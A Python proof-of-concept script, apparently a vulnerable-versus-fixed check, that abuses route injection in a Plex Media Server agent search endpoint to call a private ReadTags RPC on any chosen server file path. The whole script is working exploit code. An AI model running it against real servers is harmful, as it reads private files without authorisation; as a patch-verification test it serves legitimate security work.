#!/usr/bin/env python3
import argparse
import base64
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


def plex_base64(data):
    return base64.b64encode(data).decode("ascii").replace("=", "_")


def cereal_string_list(value):
    data = f"cereal1\n1\nlist\n1\ns{len(value)}\n{value}r0\n"
    return plex_base64(data.encode("utf-8"))


def cereal_empty_dict():
    return plex_base64(b"cereal1\n1\ndict\n0\nr0\n")


def main():
    parser = argparse.ArgumentParser(
        description="Invoke LocalMedia ReadTags through Plex Framework route injection"
    )
    parser.add_argument("--url", required=True, help="Plex server origin")
    parser.add_argument("--file", required=True, help="File path inside the Plex server")
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--marker", help="String expected in the vulnerable response")
    args = parser.parse_args()

    if args.expect == "vulnerable" and not args.marker:
        parser.error("--marker is required with --expect vulnerable")

    origin = args.url.rstrip("/")
    parsed = urllib.parse.urlsplit(origin)
    if (parsed.scheme not in ("http", "https") or not parsed.netloc or
            parsed.path or parsed.query or parsed.fragment):
        parser.error("--url must be an HTTP(S) origin without a path")
    if not args.file.startswith("/"):
        parser.error("--file must be an absolute server-side path")

    rpc_name = plex_base64(b"MessageKit:ReadTags")
    rpc_args = cereal_string_list(args.file)
    rpc_kwargs = cereal_empty_dict()
    injected = (
        "com.plexapp.agents.localmedia/messaging/function/"
        f"{rpc_name}/{rpc_args}/{rpc_kwargs}#"
    )
    query = urllib.parse.urlencode(
        {"identifier": injected, "mediaType": "1", "lang": "en-US"}
    )
    endpoint = (
        f"{origin}/system/agents/tv.plex.agents.movie/searchOne?{query}"
    )
    request = urllib.request.Request(endpoint, data=b"LAB", method="POST")
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            status, body = response.status, response.read()
    except urllib.error.HTTPError as exc:
        status, body = exc.code, exc.read()

    text = body.decode("utf-8", "replace")
    print(f"HTTP {status}")
    print(text)
    if args.expect == "vulnerable":
        try:
            parsed_body = json.loads(text)
        except json.JSONDecodeError as exc:
            raise RuntimeError("response was not the expected ReadTags JSON") from exc
        if status != 200 or args.marker not in text:
            raise RuntimeError("marker was not returned")
        if not isinstance(parsed_body, dict):
            raise RuntimeError("ReadTags response was not a JSON object")
    else:
        try:
            root = ET.fromstring(text)
        except ET.ParseError as exc:
            raise RuntimeError("fixed response was not the expected XML") from exc
        if (status != 200 or root.tag != "SearchResponse" or
                root.attrib.get("status") != "Agent not found" or
                root.attrib.get("code") != "2"):
            raise RuntimeError("fixed build did not reject the injected identifier")
    if args.expect == "vulnerable":
        print("PASS: fixture marker returned by private ReadTags RPC")
    else:
        print("PASS: injected agent identifier rejected")


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError, ET.ParseError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
